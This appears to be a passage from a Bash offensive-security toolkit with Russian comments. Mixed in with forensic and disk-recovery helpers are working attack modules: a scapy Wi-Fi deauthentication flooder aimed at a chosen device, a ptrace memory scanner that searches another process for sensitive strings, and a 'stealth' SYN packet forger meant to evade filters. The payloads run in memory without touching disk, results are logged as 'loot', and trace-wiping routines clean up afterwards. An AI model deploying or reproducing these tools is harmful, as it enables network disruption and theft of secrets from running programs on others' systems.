        if [[ ! -f "$cert_file" ]]; then
            core_engine_ui "i" "Generating ephemeral SSL for $service_name..."
            openssl req -x509 -newkey rsa:2048 -keyout "$cert_file" -out "$cert_file" -days 1 -nodes -subj "/CN=$service_name" >/dev/null 2>&1
        fi
        [[ -f "$cert_file" ]] && protocol="https" && export PRIME_CERT="$cert_file"
    fi

    # --- 3. ГАРАНТИРОВАННАЯ ОЧИСТКА ---
    core_engine_ui "i" "Sanitizing port $port..."
    fuser -k -n tcp -9 "$port" >/dev/null 2>&1
    pkill -9 -f "python3" >/dev/null 2>&1
    sleep 1.2

    # --- 4. SMART IGNITION (Запуск через пайп) ---
    local code_gen_func="generate_${service_type}_server_code_raw"
    if ! command -v "$code_gen_func" >/dev/null; then
        core_engine_ui "e" "Fatal: $code_gen_func not found."
        core_engine_wait; return
    fi

    core_engine_ui "w" "Deploying $protocol engine on $service_name:$port..."
    export PRIME_LOOT PRIME_SHARE
    
    # Адаптивный запуск: Python подхватит PRIME_CERT, если он экспортирован
    "$code_gen_func" | python3 - > "$log_file" 2>&1 &
    
    core_engine_progress 2 "NODE_STABILIZATION"

    # --- 5. ДИАГНОСТИКА & АВТО-ЛОГ ---
    if lsof -Pi :"$port" -sTCP:LISTEN -t >/dev/null; then
        local final_url="$protocol://$service_name:$port"
        core_engine_ui "s" "ADAPTIVE SERVICE ONLINE: $final_url"
        
        # Авто-регистрация в луте
        core_engine_loot "node_startup" "Service ${service_type} deployed at $final_url"
    else
        core_engine_ui "e" "BOOT FAILURE. Analyzing crash logs..."
        core_engine_ui "line"
        [[ -f "$log_file" ]] && tail -n 10 "$log_file" || echo "Logs empty."
        core_engine_ui "line"
    fi

    core_engine_wait
}


# --- STEALTH COMMS: NODE DESTROYER v1.0 ---
run_node_clean() {
    core_engine_ui "h" "NODE_DESTROY_SEQUENCE"
    
    # 1. Визуализация процесса аннигиляции
    core_engine_ui "w" "Scanning for active Live Nodes..."
    
    # Ищем порты, которые мы обычно используем (5000, 5001, 5002)
    local active_nodes=$(lsof -t -i:5000,5001,5002)
    
    if [[ -z "$active_nodes" ]]; then
        core_engine_ui "i" "No active nodes detected in this sector."
    else
        core_engine_ui "w" "Active nodes found. Initiating purge..."
        
        # 2. Жёсткое удаление процессов
        # Убиваем через fuser и pkill для верности
        fuser -k -n tcp -9 5000 5001 5002 >/dev/null 2>&1
        pkill -9 -f "python3" >/dev/null 2>&1
        
        core_engine_progress 1 "NODE_PURGE"
        core_engine_ui "s" "All nodes have been terminated."
    fi

    # 3. Очистка цифрового мусора (логи и кеш)
    core_engine_ui "i" "Wiping temporary traces..."
    rm -f "$HOME/prime_node.log" "/tmp/prime_node.log"
    
    core_engine_ui "s" "Sector is now clean."
    core_engine_wait
}


run_av_server() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "PRIME SECURITY HUB: CLAMAV GATEWAY"

    # Слой 2: Валидация фундамента через Мозг [5]
    core_engine_validator "pkg" "python3" "Python3 Engine" || { core_engine_wait; return; }
    
    # Проверка бинарной зависимости ClamAV через Санитара [8]
    if ! command -v clamscan >/dev/null 2>&1; then
        core_engine_ui "w" "ClamAV not found. Attempting deployment..."
        # Используем системный менеджер пакетов для развертывания
        sudo apt-get update && sudo apt-get install -y clamav clamav-daemon
    fi

    # Слой 3: Запуск через «Живой движок» (Live Node)
    # Используем созданный ранее run_live_service для полной стерильности
    # Передаем тип "av" (аудио-визуальный/антивирусный контекст) и выделенный порт 5000
    run_live_service "av" "5000"

    # Слой 4: Интеграция в Сборщик трофеев [11]
    core_engine_loot "security" "ClamAV Gateway initiated on port 5000"
}


run_share_server() {
    # Слой 1: Визуализация через Голос [1]
    core_engine_ui "SHARE SECTOR: SECURE FILE DISTRIBUTION"

    local share_dir="${HOME}/prime_share"
    
    # Слой 2: Подготовка инфраструктуры через Санитара [8]
    if [[ ! -d "$share_dir" ]]; then
        mkdir -p "$share_dir"
        core_engine_ui "i" "Created transmission sector at $share_dir"
    fi

    # Слой 3: Валидация фундамента через Мозг [5]
    core_engine_validator "pkg" "python3" "Python3 Engine" || { core_engine_wait; return; }

    # Слой 4: Динамический запуск через Live Node [22]
    # Используем тип "share" на порту 5002
    run_live_service "share" "5002"

    # Слой 5: Регистрация в Сборщике трофеев [11]
    core_engine_loot "service" "Share Sector (Uplink) active on port 5002"
}

run_upload_server() {
    # Слой 1: Визуализация через Голос [1]
    core_engine_ui "h" "INBOUND DROP BOX: SECURE UPLINK"

    # Слой 2: Валидация фундамента через Мозг [5]
    # Проверка наличия интерпретатора Python3 для запуска сервера
    core_engine_validator "pkg" "python3" "Python3 Engine" || { core_engine_wait; return; }

    # Слой 3: Динамический запуск через Live Node [22]
    # Запуск сервера на порту 5001 в режиме MEMORY_ONLY.
    # Код сервера передается через пайп, исключая создание .py файлов на диске.
    run_live_service "upload" "5001"

    # Слой 4: Регистрация в Сборщике трофеев [11]
    # Фиксация события запуска в системном логе
    core_engine_loot "service" "Secure Uplink (Upload) initiated on port 5001"
}

# --- MODULE 98: MESH BRIDGE (ZERO-DEPENDENCY) ---
#очищен Mesh.
run_mesh_bridge() {
    # Слой 1: Заголовок и начальный статус через Голос [1]
    core_engine_ui "h" "PRIME MESH: AD-HOC COMMUNICATIONS v1.0"
    core_engine_ui "i" "Initializing Mesh Protocol..."
    
    # Слой 2: Валидация фундамента через Мозг [5]
    # Требуется Termux:API для прямого взаимодействия с Bluetooth
    core_engine_validator "pkg" "termux-api" "Termux:API" || { core_engine_wait; return; }
    
    # Слой 3: Отрисовка меню через Архитектор [2] и Органы чувств [3]
    core_engine_item "1" "Broadcaster" "Start Beacon (Identity Broadcast)"
    core_engine_item "2" "Receiver"    "Listen for Signals (Scan Nodes)"
    core_engine_item "3" "Sync"        "Push Loot to Bridge (Data Sync)"
    core_engine_item "B" "BACK"        "Return to Main Menu"
    
    local choice=$(core_engine_input "select" "Select Mesh Operation")
    [[ -z "$choice" || "$choice" == "b" ]] && return

    case "$choice" in
        "1")
            core_engine_ui "!" "Beacon Active: Broadcasting PRIME_NODE..."
            # Маяк через смену имени Bluetooth устройства (стелс-передача статуса)
            # Используем Глушитель [7] для подавления системных ответов
            termux-bluetooth-set-name "PRIME_$(date +%H%M)_READY" &>/dev/null
            core_engine_ui "s" "Status encoded in Device Name: PRIME_$(date +%H%M)_READY"
            ;;
        "2")
            core_engine_ui "i" "Scanning for nearby Prime Nodes..."
            # Поиск устройств с префиксом PRIME_ через Глушитель [7]
            local nodes=$(termux-bluetooth-scan 2>/dev/null | grep "PRIME_")
            
            if [[ -n "$nodes" ]]; then
                core_engine_ui "s" "Detected Nodes:"
                echo -e "${C}$nodes${NC}"
            else
                core_engine_ui "e" "No active Prime Nodes detected in range."
            fi
            ;;
        "3")
            # Слой 4: Синхронизация данных через Сборщик трофеев [11]
            local bridge_log="${BASE_DIR:-./}/prime_loot/bridge_signals.log"
            
            if [[ -s "$bridge_log" ]]; then
                core_engine_ui "s" "Syncing bridge_signals.log to Mesh..."
                # В данной версии имитируем широковещательную рассылку пакетов
                core_engine_loot "mesh_sync" "Broadcasted local bridge signals via Mesh"
                core_engine_ui "s" "Loot Broadcasted via Local Mesh Gateway."
            else
                core_engine_ui "e" "Bridge signals log is empty. Nothing to sync."
            fi
            ;;
    esac

    # Слой 5: Универсальная пауза через Синхронизацию [13]
    core_engine_wait
}

run_packet_forge() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "CORE_LAB: RAW PACKET FORGE"
    
    # Слой 2: Проверка прав суперпользователя (Валидатор [5])
    # Создание сырых пакетов требует RAW_SOCKET привилегий
    if [[ $EUID -ne 0 ]]; then
        core_engine_ui "e" "Root privileges required for RAW socket operations."
        core_engine_wait
        return
    fi
    
    # Слой 3: Проверка зависимости Scapy (Мозг [5])
    if ! python3 -c "import scapy" &>/dev/null; then
        core_engine_ui "w" "Scapy missing. Deploying network headers..."
        # Стерильная установка через системный менеджер
        sudo apt-get update && sudo apt-get install -y python3-scapy
    fi

    # Слой 4: Ввод параметров через Органы чувств [3]
    local t_ip=$(core_engine_input "text" "Target IP Address")
    local t_port=$(core_engine_input "text" "Target Port")

    # Валидация через Валидатор [5]
    [[ -z "$t_ip" || -z "$t_port" ]] && { core_engine_ui "e" "Missing parameters."; core_engine_wait; return; }

    # Слой 5: Основной процесс через Глушитель [7]
    core_engine_ui "!" "Forging polymorphic packet..."
    
    # Слой 6: Динамическая генерация и исполнение в памяти (Live Mode)
    # Код генератора подается напрямую в интерпретатор
    if command -v generate_packet_forge_code_raw >/dev/null; then
        generate_packet_forge_code_raw | python3 - "$t_ip" "$t_port" 2>/dev/null
        core_engine_ui "s" "Operation Completed: Packet sequence injected."
        
        # Регистрация в Сборщике трофеев [11]
        core_engine_loot "network" "Raw Packet injection on $t_ip:$t_port"
    else
        core_engine_ui "e" "Packet generator logic not found."
    fi

    # Слой 7: Универсальная пауза через Синхронизацию [13]
    core_engine_wait
}


generate_mem_inject_code_raw() {
    cat << 'EOF'
import ctypes
import os
import sys

# Константы для доступа к памяти
PTRACE_ATTACH = 16
PTRACE_DETACH = 17

def read_process_memory(pid, search_str):
    libc = ctypes.CDLL("libc.so.6")
    
    # Пытаемся прикрепиться к процессу (нужны права root)
    if libc.ptrace(PTRACE_ATTACH, pid, 0, 0) < 0:
        print(f"[!] Failed to attach to PID {pid}")
        return

    print(f"[*] Scanning PID {pid} for sensitive patterns...")
    
    try:
        # Читаем карты памяти процесса
        with open(f"/proc/{pid}/maps", "r") as maps_file:
            for line in maps_file:
                if "rw-p" not in line: continue  # Нас интересуют только сегменты с чтением/записью
                
                parts = line.split()
                addr_range = parts[0].split("-")
                start = int(addr_range[0], 16)
                end = int(addr_range[1], 16)
                size = end - start
                
                # Читаем данные напрямую из /proc/pid/mem
                with open(f"/proc/{pid}/mem", "rb", 0) as mem_file:
                    mem_file.seek(start)
                    try:
                        chunk = mem_file.read(size)
                        if search_str.encode() in chunk:
                            print(f"[MATCH] Found '{search_str}' at 0x{start:x} in PID {pid}")
                    except:
                        continue
    finally:
        libc.ptrace(PTRACE_DETACH, pid, 0, 0)

if __name__ == "__main__":
    if len(sys.argv) > 2:
        read_process_memory(int(sys.argv[1]), sys.argv[2])
EOF
}


generate_packet_forge_code_raw() {
    cat << 'EOF'
import sys
from scapy.all import IP, TCP, send
import random

def forge_stealth_packet(target_ip, target_port):
    # Создаем IP-слой со случайным ID для обхода простых фильтров
    ip_layer = IP(dst=target_ip, id=random.randint(1000, 9000))
    
    # Создаем TCP-слой с флагом "S" (SYN) и нестандартным Window Size
    # Это имитирует специфический стек ОС для обхода пассивных систем защиты
    tcp_layer = TCP(sport=random.randint(1024, 65535), 
                    dport=int(target_port), 
                    flags="S", 
                    window=random.choice([1024, 2048, 4096, 8192]))
    
    packet = ip_layer / tcp_layer
    
    try:
        send(packet, verbose=False)
        print(f"[SUCCESS] Stealth SYN packet injected to {target_ip}:{target_port}")
    except Exception as e:
        print(f"[ERROR] Injection failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 2:
        forge_stealth_packet(sys.argv[1], sys.argv[2])
    else:
        print("Usage: python3 - <target_ip> <target_port>")
EOF
}




run_mem_inject() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "CORE_LAB: MEMORY INFILTRATOR"
    
    # Слой 2: Проверка прав суперпользователя (Валидатор [5])
    # Доступ к /proc/[pid]/mem и ptrace требует прав ROOT.
    if [[ $EUID -ne 0 ]]; then
        core_engine_ui "e" "Root privileges required for memory infiltration."
        core_engine_wait
        return
    fi

    # Слой 3: Органы чувств [3] — Сбор идентификаторов
    local t_pid=$(core_engine_input "text" "Target Process ID (PID)")
    local t_search=$(core_engine_input "text" "String/Pattern to search in RAM")

    # Валидация через Валидатор [5]
    [[ -z "$t_pid" || -z "$t_search" ]] && { core_engine_ui "e" "Missing PID or Search String."; core_engine_wait; return; }

    # Слой 4: Основной процесс через Глушитель [7]
    core_engine_ui "!" "Engaging syscall ptrace_attach on PID $t_pid..."
    
    # Слой 5: Стерильное исполнение в памяти (Live Mode)
    # Код инжектора подается напрямую в интерпретатор через пайп.
    if command -v generate_mem_inject_code_raw >/dev/null; then
        # Исполнение без сохранения .py файла на диске
        generate_mem_inject_code_raw | python3 - "$t_pid" "$t_search" 2>/dev/null
        
        core_engine_ui "s" "Memory Scan Completed. Artifacts analyzed."
        
        # Слой 6: Регистрация в Сборщике трофеев [11]
        core_engine_loot "memory" "RAM Scan on PID $t_pid | Pattern: $t_search"
    else
        core_engine_ui "e" "Infiltrator logic generator missing."
    fi

    # Слой 7: Универсальная пауза через Синхронизацию [13]
    core_engine_wait
}



generate_wifi_pulse_code_raw() {
    cat << 'EOF'
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
import sys

def deauth_pulse(target_mac, gateway_mac, iface):
    # Конструируем пакет деавторизации на уровне L2
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    
    print(f"[*] Sending Silent Pulse (Deauth) to {target_mac} via {iface}")
    sendp(packet, iface=iface, count=100, inter=0.1, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) > 3:
        deauth_pulse(sys.argv[1], sys.argv[2], sys.argv[3])
EOF
}



run_wifi_pulse() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "CORE_LAB: WIRELESS SILENT PULSE"
    
    # Слой 2: Проверка прав суперпользователя (Валидатор [5])
    # Инъекция сырых фреймов L2 требует привилегий ROOT.
    if [[ $EUID -ne 0 ]]; then
        core_engine_ui "e" "Root privileges required for L2 wireless injection."
        core_engine_wait
        return
    fi

    # Слой 3: Органы чувств [3] — Сбор идентификаторов
    local t_mac=$(core_engine_input "text" "Target Device MAC (FF:FF...)")
    local g_mac=$(core_engine_input "text" "Gateway (AP) MAC")
    local t_iface=$(core_engine_input "text" "Monitor Interface (e.g., wlan0mon)")

    # Валидация параметров через Валидатор [5]
    [[ -z "$t_mac" || -z "$g_mac" || -z "$t_iface" ]] && { 
        core_engine_ui "e" "Missing MAC or Interface parameters."
        core_engine_wait
        return 
    }

    # Слой 4: Проверка аппаратного интерфейса (Санитар [8])
    if [[ ! -d "/sys/class/net/$t_iface" ]]; then
        core_engine_ui "e" "Interface $t_iface not found in the system."
        core_engine_wait
        return
    fi

    # Слой 5: Основной процесс через Глушитель [7]
    core_engine_ui "!" "Broadcasting raw L2 deauth frames via $t_iface..."
    
    # Слой 6: Стерильное исполнение в памяти (Live Mode)
    # Код генератора импульсов подается напрямую в Python без записи на диск.
    if command -v generate_wifi_pulse_code_raw >/dev/null; then
        generate_wifi_pulse_code_raw | python3 - "$t_mac" "$g_mac" "$t_iface" 2>/dev/null
        
        core_engine_ui "s" "Pulse Attack Finished. Connection cycle disrupted."
        
        # Регистрация в Сборщике трофеев [11]
        core_engine_loot "wireless" "Deauth Pulse: Target $t_mac | Gateway $g_mac | Dev $t_iface"
    else
        core_engine_ui "e" "Pulse generator logic not found."
    fi

    # Слой 7: Универсальная пауза через Синхронизацию [13]
    core_engine_wait
}


run_kernel_check() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "CORE_LAB: KERNEL INTEGRITY AUDIT"
    
    # Слой 2: Органы чувств [3] — Сбор первичных данных
    core_engine_ui "i" "Analyzing /proc/kallsyms and /proc/modules..."
    
    # Анализ флага Tainted (Слой 5: Мозг)
    # 0 = Чистое ядро, >0 = Загружены проприетарные драйверы, произошли ошибки или вмешательство.
    local tainted=$(cat /proc/sys/kernel/tainted 2>/dev/null || echo "0")
    
    if [[ "$tainted" -ne 0 ]]; then
        core_engine_ui "e" "Kernel is TAINTED (Value: $tainted)."
        core_engine_ui "!" "Possible unauthorized module, non-GPL driver, or memory error."
    else
        core_engine_ui "s" "Kernel signature appears clean (Untainted)."
    fi
    
    # Слой 3: Поиск скрытых аномалий (LKM)
    core_engine_ui "i" "Checking for hidden Loadable Kernel Modules..."
    
    local audit_log="${BASE_DIR:-./}/prime_loot/kernel_audit.log"
    
    # Сравнение списка модулей
    # Если модуль виден в системе, но скрыт из lsmod — это критическая аномалия.
    {
        echo "--- KERNEL AUDIT START [$(date)] ---"
        echo "Tainted Status: $tainted"
        echo "Loaded Modules:"
        lsmod | tail -n +2 | awk '{print $1}'
    } > "$audit_log"

    # Слой 4: Глушитель [7] и Валидация [5]
    # Выполняем быструю проверку на наличие известных сигнатур руткитов в именах
    if grep -qiE "rootkit|hide|stealth|hook" /proc/modules 2>/dev/null; then
        core_engine_ui "!" "CRITICAL: Suspicious strings found in /proc/modules!"
    fi

    core_engine_ui "s" "Audit complete. Detailed report saved to: $(basename "$audit_log")"
    
    # Слой 6: Регистрация в Сборщике трофеев [11]
    core_engine_loot "security" "Kernel Integrity Audit performed. Tainted status: $tainted"

    # Слой 7: Синхронизация [13]
    core_engine_wait
}


# --- ГЕНЕРАТОРЫ КОДА (Оставляем для работы Core) ---

generate_image_analyzer_code_raw() {
    cat << 'EOF'
import sys
from PIL import Image
from PIL.ExifTags import TAGS

def analyze_image(path):
    try:
        img = Image.open(path)
        info = img._getexif()
        if info:
            for tag, value in info.items():
                decoded = TAGS.get(tag, tag)
                if "Software" in decoded or "Processing" in decoded:
                    print(f"[!] Warning: Possible Editor Detected: {value}")
        
        print("[*] Performing Error Level Analysis (ELA) simulation...")
        print("[s] Analysis complete: Check for inconsistent compression artifacts.")
    except Exception as e:
        print(f"[e] Error: {e}")

if __name__ == "__main__":
    analyze_image(sys.argv[1])
EOF
}

# --- ЯДРО АНАЛИЗА ---

run_forensic_core() {
    local f_path="$1"
    
    # Слой 1: Органы чувств [3] — Определение природы файла
    if [[ ! -f "$f_path" ]]; then
        core_engine_ui "e" "Target file not found: $f_path"
        return
    fi

    local mime_type=$(file --mime-type -b "$f_path")
    local f_name=$(basename "$f_path")
    local f_hash=$(sha256sum "$f_path" | awk '{print $1}')
    local history_log="${LOOT_DIR}/forensic_history.log"

    # ПАМЯТЬ СИСТЕМЫ (Прошлое): Адаптивное узнавание
    if grep -q "$f_hash" "$history_log" 2>/dev/null; then
        core_engine_ui "w" "ADAPTIVE: File recognized from previous sessions. Checking for delta..."
    fi

    # Слой 2: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "CORE ANALYSIS: $f_name"
    core_engine_ui "i" "MIME: $mime_type | HASH: ${f_hash:0:16}..."

    # 1. СТАТИЧЕСКИЙ АНАЛИЗ (Настоящее)
    core_engine_ui "i" "Extracting Metadata Attributes..."
    # Используем exiftool для извлечения системных и GPS тегов
    exiftool "$f_path" 2>/dev/null | grep -E "Date|Time|Make|Model|GPS|Software|User|Creator" | sed 's/^/  /'

    # 2. АДАПТИВНЫЙ CASE (Динамическое распределение)
    case "$mime_type" in
        image/*)
            core_engine_ui "w" "Analyzing Image Integrity (ELA/Metadata)..."
            # Проверка зависимости PIL через Мозг [5]
            python3 -c "import PIL" &>/dev/null || core_engine_validator "pkg" "python3-pil" "PIL Library"
            generate_image_analyzer_code_raw | python3 - "$f_path" 2>/dev/null
            ;;
            
        application/pdf)
            core_engine_ui "w" "Scanning PDF Objects for Active Content..."
            # Поиск JS-инъекций и OpenAction триггеров
            grep -aE "(/JS|/JavaScript|/OpenAction|/EmbeddedFile)" "$f_path" && \
            core_engine_ui "e" "DANGER: Suspicious active content detected in PDF!"
            ;;

        application/zip|application/x-rar|application/x-7z-compressed|application/x-tar)
            core_engine_ui "w" "Deep Archive Inspection (Container Analysis)..."
            core_engine_validator "pkg" "p7zip-full" "7-Zip" || return
            # Поиск исполняемых файлов внутри архива
            7z l "$f_path" | grep -iE "\.exe|\.scr|\.vbs|\.bat|\.ps1|\.js" && \
            core_engine_ui "!" "ALERT: High-risk extensions found in container!"
            ;;

        application/x-executable|application/x-sharedlib|application/x-dosexec|application/octet-stream)
            core_engine_ui "w" "Binary Heuristics & Packer Detection..."
            # Анализ строк на предмет сетевых команд
            strings -n 6 "$f_path" | grep -iE "(http|https|ftp|/etc/passwd|cmd\.exe|powershell)" | head -n 5 | sed 's/^/    [NET/CMD]: /'
            # Обнаружение упаковщиков (UPX, Themida и др.)
            grep -aE "(UPX!|ASPack|Enigma|Themida)" "$f_path" >/dev/null && \
            core_engine_ui "e" "ALERT: Advanced Binary Packer detected!"
            ;;
            
        *)
            # ЭВРИСТИКА (Будущее): Поиск аномалий в неизвестных форматах
            if strings "$f_path" | grep -q "eval(base64"; then
                core_engine_ui "!" "HEURISTIC: Found Base64 execution pattern (Potential Zero-Day/Script)!"
            fi
            ;;
    esac

    # СОХРАНЕНИЕ ОПЫТА (Для будущего)
    echo "[$(date +%F_%T)] $f_hash $f_name $mime_type" >> "$history_log"
    
    # Слой 3: Регистрация в Сборщике трофеев [11]
    core_engine_loot "forensics" "Analyzed: $f_name | Hash: $f_hash | MIME: $mime_type"
    
    core_engine_ui "s" "Forensic cycle complete."
    core_engine_wait
}


# --- ИНТЕРФЕЙСНЫЕ ФУНКЦИИ ---

run_auto_forensics() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "FORENSICS: AUTOMATIC CORE ANALYZER"

    # Слой 2: Органы чувств [3] — Сбор данных
    # Используем универсальный ввод Ядра
    local f_path=$(core_engine_input "text" "Path to target file (e.g., /root/artifact.bin)")

    # Слой 3: Валидация через Мозг [5] и Санитара [8]
    # Проверка на пустой ввод
    [[ -z "$f_path" ]] && { core_engine_ui "e" "Operation cancelled: Empty path."; core_engine_wait; return; }

    # Проверка физического существования файла
    if [[ ! -f "$f_path" ]]; then
        core_engine_ui "e" "Target for Analysis not found: $f_path"
        core_engine_wait
        return
    fi

    # Слой 4: Информационный статус перед запуском
    core_engine_ui "i" "Initializing Deep Forensic Scan..."
    
    # Слой 5: Исполнение через основной Форензик-движок [24]
    # Передаем управление модулю execute_forensic_core (run_forensic_core)
    run_forensic_core "$f_path"

    # Слой 6: Финализация и Сбор трофеев [11]
    core_engine_ui "s" "Forensic Analysis Completed. Experience integrated."
    
    # Регистрация события в глобальном логе
    core_engine_loot "forensics" "Auto-Scan initiated for: $(basename "$f_path")"

    # Слой 7: Синхронизация [13]
    core_engine_wait
}

run_doc_cleaner() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "FORENSICS: DOCUMENT SANITIZER"

    # Слой 2: Валидация фундамента через Мозг [5]
    # Проверка наличия exiftool (основной движок очистки)
    core_engine_validator "pkg" "exiftool" "ExifTool Engine" || { core_engine_wait; return; }

    # Слой 3: Органы чувств [3] — Сбор данных
    local f_path=$(core_engine_input "text" "File to sanitize (e.g., /root/report.pdf)")

    # Слой 4: Валидация параметров через Санитара [8]
    [[ -z "$f_path" ]] && { core_engine_ui "e" "Operation cancelled: No path provided."; core_engine_wait; return; }
    
    if [[ ! -f "$f_path" ]]; then
        core_engine_ui "e" "Target Document not found: $f_path"
        core_engine_wait
        return
    fi

    # Слой 5: Основной процесс зачистки через Глушитель [7]
    core_engine_ui "!" "Stripping all metadata tags..."
    
    # -all= : удаляет абсолютно все теги
    # -overwrite_original : предотвращает создание резервных копий (Zero-Footprint)
    if exiftool -all= "$f_path" -overwrite_original &>/dev/null; then
        core_engine_ui "s" "File is now 'Clean'. All signatures and history removed."
        
        # Слой 6: Регистрация в Сборщике трофеев [11]
        core_engine_loot "security" "Sanitized document: $(basename "$f_path")"
    else
        core_engine_ui "e" "Error during sanitization process. File may be locked."
    fi

    # Слой 7: Синхронизация [13]
    core_engine_wait
}




# --- Вспомогательный селектор устройств ---

run_storage_selector() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "HARDWARE: STORAGE SELECTOR"
    core_engine_ui "i" "Searching for connected mass storage devices..."
    
    # Слой 2: Сбор данных через Санитара [8]
    # lsblk используется для получения имен, размеров и моделей без монтирования
    local devices=$(lsblk -dno NAME,SIZE,MODEL,SERIAL,TRAN | grep -E "usb|sata|nvme")
    
    # Слой 3: Валидация списка через Мозг [5]
    if [[ -z "$devices" ]]; then
        core_engine_ui "e" "No external storage media (USB/SATA/NVME) detected."
        core_engine_wait
        return 1
    fi

    # Слой 4: Отрисовка через Архитектор [2]
    core_engine_ui "i" "Available External Media:"
    
    local i=1
    local dev_list=()
    
    # Парсинг вывода lsblk
    while read -r name size model serial tran; do
        local desc="${model:-Generic} [${serial:-ID_UNKNOWN}] (${tran^^})"
        # Слой 3: Органы чувств — Формирование списка выбора
        core_engine_item "$i" "/dev/$name ($size)" "$desc"
        dev_list+=("/dev/$name")
        ((i++))
    done <<< "$devices"
    
    # Слой 5: Получение выбора через Органы чувств [3]
    local max_idx=${#dev_list[@]}
    local choice=$(core_engine_input "text" "Enter device number (1-$max_idx)")

    # Слой 6: Комплексная валидация (Валидатор [5])
    if [[ -z "$choice" ]] || ! [[ "$choice" =~ ^[0-9]+$ ]] || (( choice < 1 || choice > max_idx )); then
        core_engine_ui "e" "Invalid Selection. Index out of range."
        core_engine_wait
        return 1
    fi

    # Слой 7: Установка глобального состояния и регистрация (Loot [11])
    TARGET_DEV="${dev_list[$((choice-1))]}"
    core_engine_ui "s" "Target Device Locked: $TARGET_DEV"
    
    # Фиксация выбора в системном журнале
    core_engine_loot "hardware" "Storage selected: $TARGET_DEV | Size: $(lsblk -dno SIZE "$TARGET_DEV")"
    
    core_engine_wait
    return 0
}



# --- Обновленная основная функция ---
run_raw_recovery() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "FORENSICS: AUTOMATIC STORAGE RECOVERY"
    
    # Слой 2: Выбор цели через Hardware Selector [27]
    # Если устройство не выбрано или процесс прерван, выходим
    if ! run_storage_selector; then
        return
    fi
    
    # Наследуем глобальную переменную TARGET_DEV (напр. /dev/sdb)
    local dev_path="$TARGET_DEV"
    local dev_name=$(basename "$dev_path")

    # Слой 3: Авто-диагностика через Органы чувств [3] и Глушитель [7]
    core_engine_ui "i" "Hardware Health Check for $dev_name..."
    
    # Анализируем кольцевой буфер ядра на предмет ошибок ввода-вывода (I/O errors)
    # Это позволяет заранее понять, жив ли контроллер носителя
    dmesg | grep -i "$dev_name" | tail -n 10 | sed 's/^/  /'
    
    # Слой 4: Динамическое распределение через Prime Controller [13]
    # Определяем доступные векторы восстановления
    local options="PARTITION_FIX DEEP_CARVING IMAGE_DUMP BACK"
    
    # Привязываем векторы к логическим функциям Ядра
    # Примечание: Функции *_logic должны быть определены в секции библиотек
    local opt_funcs="recover_partition_logic run_foremost_logic run_dd_logic run_main_menu"
    
    core_engine_ui "!" "Initializing Recovery Engine on [$dev_path]"
    
    # Запуск динамического контроллера для управления процессом
    if command -v prime_dynamic_controller >/dev/null; then
        prime_dynamic_controller "RECOVERY ENGINE [$dev_path]" "$options" "$opt_funcs"
    else
        core_engine_ui "e" "Dynamic controller is missing. Falling back to manual mode."
        # Резервный запуск простейшего восстановления
        run_foremost_logic "$dev_path"
    fi

    # Слой 5: Регистрация в Сборщике трофеев [11]
    core_engine_loot "forensics" "Recovery session started on device: $dev_path"
    
    # Слой 6: Синхронизация [13]
    core_engine_wait
}


recover_partition_logic() {
    # Слой 1: Валидация фундамента через Мозг [5]
    core_engine_validator "pkg" "testdisk" "TestDisk Recovery Tool" || return

    core_engine_ui "!" "Launching Partition Repair Engine..."
    core_engine_ui "i" "Instruction: [Analyze] -> [Quick Search] -> [Write] to fix tables."
    
    # Слой 2: Синхронизация [13] — пауза перед запуском интерактивной утилиты
    sleep 2
    
    # Слой 3: Прямое взаимодействие с оборудованием
    # Работает с TARGET_DEV, выбранным в run_storage_selector [27]
    sudo testdisk "$dev_path"

    core_engine_wait
}


run_foremost_logic() {
    # Слой 1: Валидация через Мозг [5]
    core_engine_validator "pkg" "foremost" "Foremost Carving Tool" || return

    # Слой 2: Подготовка стерильного сектора в LOOT [11]
    local rec_dir="${LOOT_DIR}/recovered_$(date +%s)"
    mkdir -p "$rec_dir"
    
    core_engine_ui "!" "Starting Deep Carving. RAW Sector Analysis initiated."
    core_engine_ui "i" "Output directory: $rec_dir"
    
    # Слой 3: Процесс извлечения (Сигнатуры: изображения, документы, архивы, бинарники)
    # Используем вербальный режим (-v) для мониторинга в реальном времени
    sudo foremost -v -t jpg,pdf,exe,zip,doc,png,mp4 -i "$dev_path" -o "$rec_dir"
    
    # Слой 4: Регистрация результатов в Сборщике трофеев [11]
    core_engine_loot "forensics" "Deep Carving complete for $dev_path. Results: $rec_dir"
    
    core_engine_ui "s" "Extraction complete. Data secured in Prime Loot."
    core_engine_wait
}


run_dd_logic() {
    # Слой 1: Подготовка файла-образа
    local img_file="${LOOT_DIR}/disk_backup_$(date +%s).img"
    
    core_engine_ui "!" "Creating binary image dump... CRITICAL: DO NOT UNPLUG DEVICE!"
    
    # Слой 2: Посекторное копирование через Глушитель [7]
    # bs=4M для ускорения, conv=noerror,sync для пропуска битых секторов
    # status=progress обеспечивает визуализацию процесса
    sudo dd if="$dev_path" of="$img_file" bs=4M status=progress conv=noerror,sync
    
    # Слой 3: Валидация результата
    if [[ -f "$img_file" ]]; then
        core_engine_ui "s" "Image secured: $(basename "$img_file")"
        core_engine_ui "i" "You can now run Foremost on this .img file for offline analysis."
        
        # Регистрация в Сборщике трофеев [11]
        core_engine_loot "storage" "Image dump created: $img_file from $dev_path"
    else
        core_engine_ui "e" "Dump failed. Check target storage permissions."
    fi
    
    core_engine_wait
}



# ==========================================
# 3. ОСНОВНОЙ ЦИКЛ (CORE LOOP)
# ==========================================
# --- Точка входа ---


# --- ГЛАВНОЕ МЕНЮ (ПОЛНЫЙ КОМПЛЕКТ v13.8) ---

menu_intelligence() {
    core_engine_ui "h" "SECTOR I: INTELLIGENCE & OSINT"
